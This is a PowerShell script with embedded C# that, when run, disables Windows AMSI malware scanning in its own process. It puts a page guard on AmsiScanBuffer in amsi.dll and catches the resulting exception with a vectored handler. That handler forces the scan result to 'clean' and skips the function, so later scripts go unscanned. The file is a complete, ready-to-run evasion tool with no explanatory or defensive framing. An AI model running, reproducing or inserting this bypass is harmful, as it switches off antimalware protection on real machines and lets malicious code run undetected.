$Guard = @"
using System;
using System.Runtime.InteropServices;

namespace Test
{
    public static class AmsiGuard
    {
        // ----------------------------
        // P/Invoke & constants
        // ----------------------------
        private const uint PAGE_EXECUTE = 0x10;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_GUARD = 0x100;
        private const int EXCEPTION_CONTINUE_EXECUTION = -1;
        private const int EXCEPTION_CONTINUE_SEARCH = 0;

        // exception codes (use your WinAPI definitions if you have them)
        private const uint STATUS_GUARD_PAGE_VIOLATION = 0x80000001;
        private const uint STATUS_SINGLE_STEP = 0x80000004;

        // AMSI result clean value (as in your example)
        private const int AMSI_RESULT_CLEAN = 0; // adjust if you have different constant

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", ExactSpelling = true)]
        private static extern IntPtr AddVectoredExceptionHandler(uint first, VectoredHandler handler);

        [DllImport("kernel32", ExactSpelling = true)]
        private static extern uint RemoveVectoredExceptionHandler(IntPtr handle);

        [DllImport("kernel32", ExactSpelling = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", ExactSpelling = true)]
        private static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        private delegate int VectoredHandler(IntPtr exceptionPointers);

        // ----------------------------
        // Native structures (x64)
        // ----------------------------
        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_INFO
        {
            public ushort wProcessorArchitecture;
            public ushort wReserved;
            public uint dwPageSize;
            public IntPtr lpMinimumApplicationAddress;
            public IntPtr lpMaximumApplicationAddress;
            public IntPtr dwActiveProcessorMask;
            public uint dwNumberOfProcessors;
            public uint dwProcessorType;
            public uint dwAllocationGranularity;
            public ushort wProcessorLevel;
            public ushort wProcessorRevision;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        // minimal EXCEPTION_RECORD fields we use
        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            // we do not need the ExceptionInformation array here
        }

        // minimal CONTEXT64 - only the fields we touch
        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public uint ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;

            public ulong Rip;
            // remaining fields omitted — not needed for this handler
        }

        // ----------------------------
        // State
        // ----------------------------
        private static IntPtr pAmsiScanBuffer = IntPtr.Zero;
        private static IntPtr vectoredHandle = IntPtr.Zero;
        private static VectoredHandler handlerDelegate = null;

        // ----------------------------
        // Public API
        // ----------------------------
        public static void Install()
        {
            ResolveAmsi();

            // create & store the delegate instance so GC won't collect it
            handlerDelegate = new VectoredHandler(Handler);

            // pass the delegate instance (not the method group)
            vectoredHandle = AddVectoredExceptionHandler(1, handlerDelegate);
            if (vectoredHandle == IntPtr.Zero)
            {
                // failed to register — handle error if needed

            }

            // Determine page base
            SYSTEM_INFO sys;
            GetSystemInfo(out sys);
            ulong pageSize = sys.dwPageSize;  // Use actual page size!
            ulong addr = (ulong)pAmsiScanBuffer.ToInt64();
            ulong pageBase = addr & ~((ulong)pageSize - 1);
            uint old;

            // Re-protect page with guard
            IntPtr basePtr = new IntPtr((long)pageBase);
            bool ok = VirtualProtect(basePtr, (UIntPtr)pageSize, PAGE_EXECUTE_READ | PAGE_GUARD, out old);
            if (!ok)
            {
            }

        }

        // ----------------------------
        // Resolver (simple)
        // ----------------------------
        private static void ResolveAmsi()
        {
            IntPtr h = IntPtr.Zero;
            h = GetModuleHandle("amsi.dll");

            // Wait for amsi.dll to be loaded
            while (h == IntPtr.Zero)
            {
                h = GetModuleHandle("amsi.dll");
                if (h != IntPtr.Zero) break;

                System.Threading.Thread.Sleep(100);
            }

            IntPtr p = GetProcAddress(h, "AmsiScanBuffer");
            pAmsiScanBuffer = p;
        }
        // ----------------------------
        // Exception handler
        // ----------------------------
        private static int Handler(IntPtr exceptionPointers)
        {
            // Marshal pointers
            var ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(exceptionPointers);
            var exRec = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);
            var ctx = Marshal.PtrToStructure<CONTEXT64>(ep.ContextRecord);

            // PAGE_GUARD hit
            if (exRec.ExceptionCode == STATUS_GUARD_PAGE_VIOLATION)
            {
                // ensure we have AmsiScanBuffer resolved
                if (pAmsiScanBuffer == IntPtr.Zero)
                {
                    ResolveAmsi(); // try to resolve now
                    if (pAmsiScanBuffer == IntPtr.Zero)
                    {
                        return EXCEPTION_CONTINUE_SEARCH;
                    }
                }

                // check exception address equals AmsiScanBuffer
                if (exRec.ExceptionAddress == pAmsiScanBuffer)
                {
                    ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ctx.Rsp);
                    IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ctx.Rsp + (6 * 8)));
                    Marshal.WriteInt32(ScanResult, 0, AMSI_RESULT_CLEAN);
                    ctx.Rip = ReturnAddress;
                    ctx.Rsp += 8;
                    ctx.Rax = 0;
                }
                // Set trap flag so we get single-step once and can reapply guard
                ctx.EFlags |= 0x100u;

                // write context back
                Marshal.StructureToPtr(ctx, ep.ContextRecord, true);

                return EXCEPTION_CONTINUE_EXECUTION;
            }

            // Single-step: reapply PAGE_GUARD to AmsiScanBuffer's page
            if (exRec.ExceptionCode == STATUS_SINGLE_STEP)
            {
                // Determine page base
                SYSTEM_INFO sys;
                GetSystemInfo(out sys);
                ulong pageSize = sys.dwPageSize;  // Use actual page size!
                ulong addr = (ulong)pAmsiScanBuffer.ToInt64();
                ulong pageBase = addr & ~((ulong)pageSize - 1);

                // Re-protect page with guard
                IntPtr basePtr = new IntPtr((long)pageBase);
                uint old;
                bool ok = VirtualProtect(basePtr, (UIntPtr)pageSize, PAGE_EXECUTE_READ | PAGE_GUARD, out old);
                if (!ok)
                {
                }


                return EXCEPTION_CONTINUE_EXECUTION;
            }

            return EXCEPTION_CONTINUE_SEARCH;
        }
    }
}
"@

Add-Type -TypeDefinition $Guard
[Test.AmsiGuard]::Install()
